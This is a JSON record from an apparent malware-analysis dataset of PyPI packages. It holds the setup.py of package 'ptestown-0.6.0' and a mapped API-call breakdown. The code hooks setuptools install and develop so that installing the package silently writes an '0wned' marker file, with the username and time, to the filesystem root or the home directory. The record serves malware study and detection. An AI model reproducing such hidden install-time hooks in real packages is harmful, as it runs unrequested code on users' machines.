[
  {
    "pyfile": "setup.py",
    "code_snippet": "import getpass\nimport os\nimport time\n\nFILENAME = '0wned'\nROOT_PATH = os.path.join(os.path.abspath(os.sep), FILENAME)\nUSER_PATH = os.path.join(os.path.expanduser('~'), FILENAME)\nUSER = getpass.getuser()\nTIME = int(time.time())\n\ndef touch_file():\n    try:\n        with open(ROOT_PATH, 'a') as root_fd:\n            message = 'Created {!r} with user {!r} at {!r}'.format(\n                ROOT_PATH,\n                USER,\n                TIME\n            )\n            print(message)\n            root_fd.write(message + '\\n')\n    except (IOError, OSError):\n        try:\n            with open(USER_PATH, 'a') as user_fd:\n                message = 'Created {!r} with user {!r} at {!r}'.format(\n                    USER_PATH,\n                    USER,\n                    TIME\n                )\n                print(message)\n                user_fd.write(message + '\\n')\n        except (IOError, OSError):\n            print('Could not write to {!r} or {!r}'.format(ROOT_PATH, USER_PATH))\n            print('What kind of tricky system are you running this on?')\n\nfrom setuptools.command.develop import develop\nfrom setuptools.command.install import install\n\nclass PostDevelopCommand(develop):\n    def run(self):\n        touch_file()\n        develop.run(self)\n\nclass PostInstallCommand(install):\n    def run(self):\n        touch_file()\n        install.run(self)\n",
    "pattern_analysis": {
      "api_sequence": [
        "os.path.abspath",
        "os.path.join",
        "os.path.expanduser",
        "os.path.join",
        "getpass.getuser",
        "time.time",
        "open",
        "open",
        "setuptools.command.develop.develop.run",
        "setuptools.command.install.install.run"
      ],
      "api_sequence_with_args": [
        "os.path.abspath(os.sep)",
        "os.path.join(os.path.abspath(os.sep), FILENAME)",
        "os.path.expanduser('~')",
        "os.path.join(os.path.expanduser('~'), FILENAME)",
        "getpass.getuser()",
        "time.time()",
        "open(ROOT_PATH, 'a')",
        "open(USER_PATH, 'a')",
        "setuptools.command.develop.develop.run(self)",
        "setuptools.command.install.install.run(self)"
      ],
      "mapped_sequence": [
        {
          "api_name": "os.path.abspath",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "os.path.join",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "os.path.expanduser",
          "id": "path_special_operations",
          "description": "Special path operations (home directory expansion, temporary directory path, executable path, directory tree generation)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "os.path.join",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "getpass.getuser",
          "id": "get_username",
          "description": "Retrieves current user's login name",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "user_information"
        },
        {
          "api_name": "time.time",
          "id": "get_current_time",
          "description": "Returns current time in seconds since epoch",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "time_operations"
        },
        {
          "api_name": "open",
          "id": "combined_mode_operations",
          "description": "Combined mode file opening operations (read-write mode, append mode, etc.)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "open",
          "id": "combined_mode_operations",
          "description": "Combined mode file opening operations (read-write mode, append mode, etc.)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "setuptools.command.develop.develop.run",
          "id": "exec_setuptools_dev",
          "description": "Executes setuptools development procedure",
          "first_id": "code_execution",
          "second_id": "module_management",
          "third_id": "package_configuration"
        },
        {
          "api_name": "setuptools.command.install.install.run",
          "id": "exec_setuptools_install",
          "description": "Executes setuptools installation procedure",
          "first_id": "code_execution",
          "second_id": "module_management",
          "third_id": "package_configuration"
        }
      ],
      "contextual_code": "import getpass\nimport os\nimport time\n\nFILENAME = '0wned'\nROOT_PATH = os.path.join(os.path.abspath(os.sep), FILENAME)\nUSER_PATH = os.path.join(os.path.expanduser('~'), FILENAME)\nUSER = getpass.getuser()\nTIME = int(time.time())\n\ndef touch_file():\n    try:\n        with open(ROOT_PATH, 'a') as root_fd:\n            message = 'Created {!r} with user {!r} at {!r}'.format(\n                ROOT_PATH,\n                USER,\n                TIME\n            )\n            print(message)\n            root_fd.write(message + '\\n')\n    except (IOError, OSError):\n        try:\n            with open(USER_PATH, 'a') as user_fd:\n                message = 'Created {!r} with user {!r} at {!r}'.format(\n                    USER_PATH,\n                    USER,\n                    TIME\n                )\n                print(message)\n                user_fd.write(message + '\\n')\n        except (IOError, OSError):\n            print('Could not write to {!r} or {!r}'.format(ROOT_PATH, USER_PATH))\n            print('What kind of tricky system are you running this on?')\n\nfrom setuptools.command.develop import develop\nfrom setuptools.command.install import install\n\nclass PostDevelopCommand(develop):\n    def run(self):\n        touch_file()\n        develop.run(self)\n\nclass PostInstallCommand(install):\n    def run(self):\n        touch_file()\n        install.run(self)"
    }
  },
  {
    "metadata": {
      "package_name": "ptestown-0.6.0",
      "source_path": "/home/blue/PyPIAgent/Dataset/study/unzip_malware/ptestown-0.6.0/ptestown-0.6.0/setup.py",
      "code_hash": "90c6dfa9c57a7933eb051b07647f4a9a"
    }
  }
]